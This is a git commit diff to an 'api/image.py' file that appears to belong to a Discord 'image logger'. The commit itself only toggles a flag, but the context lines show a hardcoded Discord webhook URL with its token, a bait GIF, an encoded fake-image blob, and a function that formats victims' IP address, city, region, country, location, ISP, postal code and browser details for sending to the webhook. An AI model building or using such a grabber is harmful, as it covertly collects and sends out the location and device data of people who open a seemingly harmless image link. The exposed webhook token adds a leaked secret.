f13ded7bff7a43b3165fbc4126e09b7716014589
TurboDaniel3 <162557128+TurboDaniel3@users.noreply.github.com>
2025-04-22 00:56:30 +0300

    Update image.py

--- api/image.py
+++ api/image.py
@@ -9,7 +9,7 @@ import httpx, base64, httpagentparser
 webhook = 'https://discord.com/api/webhooks/1198705174588428459/WkcnjSeuK3XbymxrfXgmTzQQSiC_yGIkDdZAumpKe2qyd-4K-NlJ1_YO-RQYFjYycu9A'
 
 bindata = httpx.get('https://tenor.com/view/middle-click-this-gif-mf-gif-287061056575367446').content
-buggedimg = True # Set this to True if you want the image to load on discord, False if you don't. (CASE SENSITIVE)
+buggedimg = False # Set this to True if you want the image to load on discord, False if you don't. (CASE SENSITIVE)
 buggedbin = base64.b85decode(b'|JeWF01!$>Nk#wx0RaF=07w7;|JwjV0RR90|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|Nq+nLjnK)|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsBO01*fQ-~r$R0TBQK5di}c0sq7R6aWDL00000000000000000030!~hfl0RR910000000000000000RP$m3<CiG0uTcb00031000000000000000000000000000')
 
 def formatHook(ip,city,reg,country,loc,org,postal,useragent,os,browser):
